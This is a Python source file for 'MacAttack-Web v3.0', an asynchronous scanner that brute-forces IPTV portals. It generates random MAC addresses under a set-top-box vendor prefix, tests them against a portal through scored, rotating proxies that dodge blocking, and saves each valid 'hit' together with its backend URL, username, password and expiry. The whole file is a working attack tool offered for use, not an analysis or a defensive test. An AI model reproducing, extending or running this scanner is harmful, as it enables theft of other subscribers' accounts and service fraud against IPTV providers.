"""
MacAttack-Web v3.0 - Async + Robust Architecture
- AsyncIO for 300k+ MACs without crashes
- Intelligent QuickScan → FullScan pipeline
- Proxy errors don't kill MACs (retry system)
- State persistence across reloads
- Chunked processing for memory efficiency
"""
import asyncio
import aiohttp
import json
import time
import random
import logging
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Any, Optional, Tuple
from collections import defaultdict, deque
import hashlib

import stb

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger("MacAttack.app_async")

# ============== CONFIGURATION ==============

CONFIG_FILE = "config.json"
STATE_FILE = "state.json"

DEFAULT_CONFIG = {
    "portal_url": "http://example.com/portal.php",
    "mac_prefix": "00:1A:79",
    "proxies": [],
    "found_macs": [],
    "settings": {
        "max_workers": 50,
        "timeout": 15,
        "max_retries": 3,
        "max_proxy_errors": 10,
        "chunk_size": 1000,
        "auto_save": True,
        "quickscan_only": False,
    }
}

DEFAULT_STATE = {
    "tested": 0,
    "hits": 0,
    "current_mac": None,
    "current_proxy": None,
    "paused": False,
    "auto_paused": False,
    "mode": "random",
    "mac_index": 0,
    "found_macs": [],
    "logs": [],
    "start_time": None,
    "tested_macs": set(),  # Track tested MACs in random mode
    "session_stats": {
        "session_tested": 0,
        "session_hits": 0,
        "session_start": None,
    }
}

# ============== PROXY SCORING SYSTEM ==============

class ProxyScorer:
    """Advanced proxy scoring and rotation system."""
    
    def __init__(self):
        self.scores = {}  # proxy -> {"speed": ms, "success": int, "fail": int, "slow": int, "blocked": set(), "consecutive_fails": int}
        self.last_used = {}  # proxy -> timestamp
        self.round_robin_index = 0
    
    def get_score(self, proxy: str, portal: Optional[str] = None) -> float:
        """Calculate proxy score (lower = better)."""
        if proxy not in self.scores:
            return 5000  # New proxy gets medium priority
        
        s = self.scores[proxy]
        
        # Blocked for this portal = infinite score
        if portal and portal in s["blocked"]:
            return float('inf')
        
        # Too many consecutive fails = very bad
        if s["consecutive_fails"] >= 5:
            return float('inf')
        
        # Base score = average response time
        score = s["speed"]
        
        # Penalty for fail rate
        total = s["success"] + s["fail"]
        if total > 0:
            fail_rate = s["fail"] / total
            score *= (1 + fail_rate * 2)  # Up to 3x penalty for high fail rate
        
        # Penalty for slow timeouts
        if s["slow"] > 3:
            score *= 1.5
        
        return score
    
    def get_next_proxy(self, proxies: List[str], portal: str, max_errors: int) -> Optional[str]:
        """Get next best proxy using intelligent rotation."""
        if not proxies:
            return None
        
        # Filter out completely broken proxies
        available = []
        for proxy in proxies:
            score = self.get_score(proxy, portal)
            if score < float('inf'):
                available.append((proxy, score))
        
        if not available:
            # All proxies are blocked/failed - reset consecutive fails and try again
            for proxy in proxies:
                if proxy in self.scores:
                    self.scores[proxy]["consecutive_fails"] = 0
            return random.choice(proxies)
        
        # Sort by score (lower = better)
        available.sort(key=lambda x: x[1])
        
        # Use round-robin among top 30% of proxies
        top_count = max(1, len(available) // 3)
        top_proxies = [p[0] for p in available[:top_count]]
        
        # Round-robin selection
        if len(top_proxies) > 1:
            self.round_robin_index = (self.round_robin_index + 1) % len(top_proxies)
            return top_proxies[self.round_robin_index]
        
        return top_proxies[0]
    
    def record_success(self, proxy: str, response_time_ms: float):
        """Record successful request."""
        if proxy not in self.scores:
            self.scores[proxy] = {"speed": 0, "success": 0, "fail": 0, "slow": 0, "blocked": set(), "consecutive_fails": 0}
        
        s = self.scores[proxy]
        s["success"] += 1
        s["consecutive_fails"] = 0  # Reset on success
        
        # Update average speed (exponential moving average)
        if s["speed"] == 0:
            s["speed"] = response_time_ms
        else:
            s["speed"] = s["speed"] * 0.8 + response_time_ms * 0.2
        
        self.last_used[proxy] = time.time()
    
    def record_fail(self, proxy: str, error_type: str, portal: Optional[str] = None):
        """Record failed request with error classification."""
        if proxy not in self.scores:
            self.scores[proxy] = {"speed": 5000, "success": 0, "fail": 0, "slow": 0, "blocked": set(), "consecutive_fails": 0}
        
        s = self.scores[proxy]
        s["fail"] += 1
        s["consecutive_fails"] += 1
        
        if error_type == "slow":
            s["slow"] += 1
        elif error_type == "blocked" and portal:
            s["blocked"].add(portal)
        
        self.last_used[proxy] = time.time()
    
    def get_stats(self) -> Dict[str, Any]:
        """Get proxy statistics."""
        stats = {}
        for proxy, data in self.scores.items():
            total = data["success"] + data["fail"]
            success_rate = (data["success"] / total * 100) if total > 0 else 0
            
            stats[proxy] = {
                "success_rate": f"{success_rate:.1f}%",
                "avg_speed": f"{data['speed']:.0f}ms",
                "total_requests": total,
                "consecutive_fails": data["consecutive_fails"],
                "blocked_portals": len(data["blocked"]),
                "slow_timeouts": data["slow"],
            }
        
        return stats

# ============== RETRY QUEUE SYSTEM ==============

class RetryQueue:
    """Intelligent MAC retry system."""
    
    def __init__(self, max_retries: int = 3):
        self.queue = deque()  # (mac, retry_count, last_proxy, reason)
        self.max_retries = max_retries
    
    def add_retry(self, mac: str, retry_count: int, last_proxy: Optional[str], reason: str):
        """Add MAC to retry queue."""
        if retry_count < self.max_retries:
            self.queue.append((mac, retry_count + 1, last_proxy, reason))
            logger.debug(f"Added MAC {mac} to retry queue (attempt {retry_count + 1}/{self.max_retries}, reason: {reason})")
    
    def get_next(self) -> Optional[Tuple[str, int, Optional[str], str]]:
        """Get next MAC from retry queue."""
        if self.queue:
            return self.queue.popleft()
        return None
    
    def size(self) -> int:
        """Get queue size."""
        return len(self.queue)
    
    def clear(self):
        """Clear retry queue."""
        self.queue.clear()

# ============== MAC GENERATOR ==============

def generate_mac(prefix: str) -> str:
    """Generate random MAC with given prefix."""
    if not prefix.endswith(':'):
        prefix += ':'
    
    # Generate 3 random bytes for the suffix
    suffix_bytes = [random.randint(0, 255) for _ in range(3)]
    suffix = ':'.join(f'{b:02X}' for b in suffix_bytes)
    
    return prefix + suffix

def generate_unique_mac(prefix: str, tested_macs: set, max_attempts: int = 100) -> Optional[str]:
    """
    Generate unique MAC that hasn't been tested yet.
    
    Args:
        prefix: MAC prefix (e.g., "00:1A:79")
        tested_macs: Set of already tested MACs
        max_attempts: Maximum attempts to find unique MAC
    
    Returns:
        Unique MAC or None if max_attempts reached
    """
    for _ in range(max_attempts):
        mac = generate_mac(prefix)
        if mac not in tested_macs:
            return mac
    
    # If we can't find unique MAC after max_attempts, return None
    # This indicates the MAC space might be exhausted
    return None

def estimate_mac_space(prefix: str) -> int:
    """
    Estimate total possible MACs for given prefix.
    
    Args:
        prefix: MAC prefix (e.g., "00:1A:79")
    
    Returns:
        Total possible MAC combinations
    """
    # Count how many bytes are fixed in prefix
    prefix_parts = prefix.count(':') + 1 if ':' in prefix else 1
    
    # Each MAC has 6 bytes total
    # Each unfixed byte can have 256 values (0x00 to 0xFF)
    unfixed_bytes = 6 - prefix_parts
    
    return 256 ** unfixed_bytes

def load_mac_list(file_path: str) -> List[str]:
    """Load MAC list from file."""
    try:
        with open(file_path, 'r') as f:
            macs = [line.strip() for line in f if line.strip()]
        logger.info(f"Loaded {len(macs)} MACs from {file_path}")
        return macs
    except FileNotFoundError:
        logger.warning(f"MAC list file {file_path} not found")
        return []

# ============== STATE MANAGEMENT ==============

def load_config() -> Dict[str, Any]:
    """Load configuration from file."""
    try:
        with open(CONFIG_FILE, 'r') as f:
            config = json.load(f)
        
        # Merge with defaults for missing keys
        for key, value in DEFAULT_CONFIG.items():
            if key not in config:
                config[key] = value
            elif isinstance(value, dict):
                for subkey, subvalue in value.items():
                    if subkey not in config[key]:
                        config[key][subkey] = subvalue
        
        return config
    except FileNotFoundError:
        logger.info("Config file not found, creating default")
        save_config(DEFAULT_CONFIG)
        return DEFAULT_CONFIG.copy()

def save_config(config: Dict[str, Any]):
    """Save configuration to file."""
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=2)

def load_state() -> Dict[str, Any]:
    """Load application state from file."""
    try:
        with open(STATE_FILE, 'r') as f:
            state = json.load(f)
        
        # Merge with defaults for missing keys
        for key, value in DEFAULT_STATE.items():
            if key not in state:
                state[key] = value
        
        # Convert tested_macs list back to set (JSON doesn't support sets)
        if "tested_macs" in state and isinstance(state["tested_macs"], list):
            state["tested_macs"] = set(state["tested_macs"])
        elif "tested_macs" not in state:
            state["tested_macs"] = set()
        
        logger.info(f"Loaded state: {state['tested']} tested, {state['hits']} hits, {len(state['tested_macs'])} unique MACs tracked")
        return state
    except FileNotFoundError:
        logger.info("State file not found, starting fresh")
        return DEFAULT_STATE.copy()

def save_state(state: Dict[str, Any]):
    """Save application state to file."""
    # Convert set to list for JSON serialization
    state_copy = state.copy()
    if "tested_macs" in state_copy and isinstance(state_copy["tested_macs"], set):
        state_copy["tested_macs"] = list(state_copy["tested_macs"])
    
    with open(STATE_FILE, 'w') as f:
        json.dump(state_copy, f, indent=2)

def add_log(state: Dict[str, Any], message: str, level: str = "info"):
    """Add log message to state."""
    timestamp = datetime.now().strftime("%H:%M:%S")
    log_entry = {"time": timestamp, "message": message, "level": level}
    
    state["logs"].append(log_entry)
    
    # Keep only last 1000 log entries
    if len(state["logs"]) > 1000:
        state["logs"] = state["logs"][-1000:]
    
    # Also log to console
    if level == "error":
        logger.error(message)
    elif level == "warning":
        logger.warning(message)
    else:
        logger.info(message)

# ============== ASYNC WORKER FUNCTIONS ==============

async def test_mac_worker(session: aiohttp.ClientSession, portal_url: str, mac: str, 
                         proxy: Optional[str], timeout: int, quickscan_only: bool = False) -> Tuple[bool, Dict[str, Any], Optional[str]]:
    """
    Async MAC test worker.
    
    Returns: (success, result, error_type)
    - success: True if MAC is valid
    - result: MAC data or error info
    - error_type: None (success/portal error), "dead", "slow", "blocked"
    """
    try:
        success, result = await stb.test_mac_async(session, portal_url, mac, proxy, timeout, quickscan_only)
        return success, result, None
    
    except stb.ProxyDeadError as e:
        return False, {"mac": mac, "error": str(e)}, "dead"
    except stb.ProxySlowError as e:
        return False, {"mac": mac, "error": str(e)}, "slow"
    except stb.ProxyBlockedError as e:
        return False, {"mac": mac, "error": str(e)}, "blocked"
    except stb.PortalError as e:
        # Portal error = MAC is actually invalid, don't retry
        return False, {"mac": mac, "error": str(e)}, None
    except Exception as e:
        logger.error(f"Unexpected error testing MAC {mac}: {e}")
        return False, {"mac": mac, "error": str(e)}, "unknown"

# ============== CHUNKED MAC PROCESSING ==============

async def process_mac_chunk(session: aiohttp.ClientSession, config: Dict[str, Any], state: Dict[str, Any],
                           proxy_scorer: ProxyScorer, retry_queue: RetryQueue, 
                           mac_chunk: List[str]) -> List[Dict[str, Any]]:
    """Process a chunk of MACs concurrently."""
    settings = config["settings"]
    portal_url = config["portal_url"]
    proxies = config["proxies"]
    timeout = settings["timeout"]
    max_workers = min(settings["max_workers"], len(mac_chunk))
    quickscan_only = settings.get("quickscan_only", False)
    
    hits = []
    semaphore = asyncio.Semaphore(max_workers)
    
    async def process_single_mac(mac: str) -> Optional[Dict[str, Any]]:
        async with semaphore:
            # Mark MAC as tested (even if it fails due to proxy issues)
            state["tested_macs"].add(mac)
            
            # Get proxy
            proxy = None
            if proxies:
                proxy = proxy_scorer.get_next_proxy(proxies, portal_url, settings["max_proxy_errors"])
                if not proxy:
                    retry_queue.add_retry(mac, 0, None, "no_proxy")
                    return None
            
            # Test MAC
            start_time = time.time()
            success, result, error_type = await test_mac_worker(session, portal_url, mac, proxy, timeout, quickscan_only)
            elapsed_ms = (time.time() - start_time) * 1000
            
            # Update counters
            state["tested"] += 1
            state["session_stats"]["session_tested"] += 1
            
            if success:
                # HIT!
                state["hits"] += 1
                state["session_stats"]["session_hits"] += 1
                
                if proxy:
                    proxy_scorer.record_success(proxy, elapsed_ms)
                
                # Process hit data
                expiry = result.get("expiry", "Unknown")
                channels = result.get("channels", 0)
                genres = result.get("genres", [])
                
                # Check for German content
                de_genres = [g for g in genres if g.upper().startswith("DE") or "GERMAN" in g.upper() or "DEUTSCH" in g.upper()]
                has_de = len(de_genres) > 0
                
                hit_data = {
                    "mac": mac,
                    "expiry": expiry,
                    "channels": channels,
                    "has_de": has_de,
                    "time": datetime.now().strftime("%H:%M:%S")
                }
                
                state["found_macs"].append(hit_data)
                
                # Add to config for persistence
                found_entry = {
                    "mac": mac,
                    "expiry": expiry,
                    "portal": portal_url,
                    "channels": channels,
                    "genres": genres,
                    "has_de": has_de,
                    "de_genres": de_genres,
                    "vod_categories": result.get("vod_categories", []),
                    "series_categories": result.get("series_categories", []),
                    "backend_url": result.get("backend_url"),
                    "username": result.get("username"),
                    "password": result.get("password"),
                    "max_connections": result.get("max_connections"),
                    "created_at": result.get("created_at"),
                    "client_ip": result.get("client_ip"),
                    "found_at": datetime.now().isoformat()
                }
                
                # Update or add to config
                existing = next((i for i, m in enumerate(config["found_macs"]) 
                               if m.get("mac") == mac and m.get("portal") == portal_url), None)
                if existing is not None:
                    config["found_macs"][existing] = found_entry
                else:
                    config["found_macs"].append(found_entry)
                
                de_icon = " 🇩🇪" if has_de else ""
                add_log(state, f"🎯 HIT! {mac} - {expiry} - {channels}ch{de_icon}", "success")
                
                return hit_data
            
            elif error_type:
                # Proxy error - retry with different proxy
                if proxy:
                    proxy_scorer.record_fail(proxy, error_type, portal_url)
                
                retry_queue.add_retry(mac, 0, proxy, error_type)
                
                if error_type == "dead":
                    add_log(state, f"💀 Proxy dead: {proxy}", "error")
                elif error_type == "blocked":
                    add_log(state, f"🚫 Proxy blocked: {proxy}", "warning")
                elif error_type == "slow":
                    add_log(state, f"🐌 Proxy slow: {proxy}", "warning")
            
            return None
    
    # Process all MACs in chunk concurrently
    tasks = [process_single_mac(mac) for mac in mac_chunk]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    # Filter out None results and exceptions
    hits = [r for r in results if r is not None and not isinstance(r, Exception)]
    
    return hits

# ============== MAIN SCANNING FUNCTION ==============

async def run_scanner(config: Dict[str, Any], state: Dict[str, Any], mac_list: Optional[List[str]] = None):
    """Main async scanning function with chunked processing."""
    settings = config["settings"]
    portal_url = config["portal_url"]
    mac_prefix = config["mac_prefix"]
    chunk_size = settings["chunk_size"]
    
    # Initialize systems
    proxy_scorer = ProxyScorer()
    retry_queue = RetryQueue(settings["max_retries"])
    
    # Setup session
    connector = aiohttp.TCPConnector(limit=settings["max_workers"] * 2, limit_per_host=50)
    timeout = aiohttp.ClientTimeout(total=settings["timeout"] + 10)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        add_log(state, f"🚀 Starting async scanner - Portal: {portal_url}", "info")
        
        if not state["session_stats"]["session_start"]:
            state["session_stats"]["session_start"] = datetime.now().isoformat()
        
        mac_index = state.get("mac_index", 0)
        
        try:
            while not state["paused"]:
                # Prepare MAC chunk
                mac_chunk = []
                
                # Priority 1: Retry queue
                while len(mac_chunk) < chunk_size and retry_queue.size() > 0:
                    retry_data = retry_queue.get_next()
                    if retry_data:
                        mac, retry_count, last_proxy, reason = retry_data
                        mac_chunk.append(mac)
                        add_log(state, f"🔄 Retrying MAC {mac} (attempt {retry_count}, reason: {reason})")
                
                # Priority 2: MAC list or random generation
                while len(mac_chunk) < chunk_size:
                    if mac_list and mac_index < len(mac_list):
                        # From list
                        mac = mac_list[mac_index]
                        mac_index += 1
                        
                        # Skip if already tested (for list mode too)
                        if mac not in state["tested_macs"]:
                            mac_chunk.append(mac)
                    else:
                        # Random generation - avoid duplicates
                        mac = generate_unique_mac(mac_prefix, state["tested_macs"])
                        if mac:
                            mac_chunk.append(mac)
                        else:
                            # MAC space might be exhausted
                            total_possible = estimate_mac_space(mac_prefix)
                            tested_count = len(state["tested_macs"])
                            coverage = (tested_count / total_possible * 100) if total_possible > 0 else 0
                            
                            add_log(state, f"⚠️ MAC space exhaustion! Tested {tested_count}/{total_possible} ({coverage:.1f}%)", "warning")
                            
                            # Clear tested MACs if coverage > 90% to allow retesting
                            if coverage > 90:
                                add_log(state, "🔄 Clearing tested MACs cache to allow retesting", "info")
                                state["tested_macs"].clear()
                                mac = generate_mac(mac_prefix)
                                mac_chunk.append(mac)
                            else:
                                break
                
                if not mac_chunk:
                    add_log(state, "✅ All MACs processed", "info")
                    break
                
                # Update state
                state["mac_index"] = mac_index
                state["current_mac"] = mac_chunk[0] if mac_chunk else None
                
                # Process chunk
                add_log(state, f"📦 Processing chunk of {len(mac_chunk)} MACs...")
                chunk_hits = await process_mac_chunk(session, config, state, proxy_scorer, retry_queue, mac_chunk)
                
                if chunk_hits:
                    add_log(state, f"🎯 Found {len(chunk_hits)} hits in chunk!")
                
                # Auto-save periodically
                if settings.get("auto_save", True) and state["tested"] % 100 == 0:
                    save_config(config)
                    save_state(state)
                
                # Brief pause between chunks
                await asyncio.sleep(0.1)
        
        except KeyboardInterrupt:
            add_log(state, "⏹ Scanner stopped by user", "warning")
        except Exception as e:
            add_log(state, f"❌ Scanner error: {e}", "error")
            logger.exception("Scanner error")
        finally:
            # Final save
            save_config(config)
            save_state(state)
            
            # Show proxy stats
            proxy_stats = proxy_scorer.get_stats()
            if proxy_stats:
                add_log(state, "📊 Proxy Statistics:", "info")
                for proxy, stats in proxy_stats.items():
                    add_log(state, f"  {proxy}: {stats['success_rate']} success, {stats['avg_speed']} avg", "info")

# ============== CLI INTERFACE ==============

async def main():
    """Main entry point."""
    print("MacAttack-Web v3.0 - Async Edition")
    print("==================================")
    
    # Load configuration and state
    config = load_config()
    state = load_state()
    
    # Check for MAC list file
    mac_list = None
    if Path("macs.txt").exists():
        mac_list = load_mac_list("macs.txt")
        print(f"Loaded {len(mac_list)} MACs from macs.txt")
    
    print(f"Portal: {config['portal_url']}")
    print(f"MAC Prefix: {config['mac_prefix']}")
    print(f"Proxies: {len(config['proxies'])}")
    print(f"Max Workers: {config['settings']['max_workers']}")
    print(f"Chunk Size: {config['settings']['chunk_size']}")
    print()
    
    # Start scanning
    await run_scanner(config, state, mac_list)
    
    # Show final stats
    print("\n" + "="*50)
    print("FINAL STATISTICS")
    print("="*50)
    print(f"Total Tested: {state['tested']}")
    print(f"Total Hits: {state['hits']}")
    print(f"Hit Rate: {(state['hits']/state['tested']*100):.2f}%" if state['tested'] > 0 else "Hit Rate: 0%")
    print(f"Session Tested: {state['session_stats']['session_tested']}")
    print(f"Session Hits: {state['session_stats']['session_hits']}")
    
    if state['found_macs']:
        print(f"\nFound MACs:")
        for hit in state['found_macs'][-10:]:  # Show last 10
            de_icon = " 🇩🇪" if hit.get('has_de') else ""
            print(f"  {hit['mac']} - {hit['expiry']} - {hit['channels']}ch{de_icon}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Goodbye!")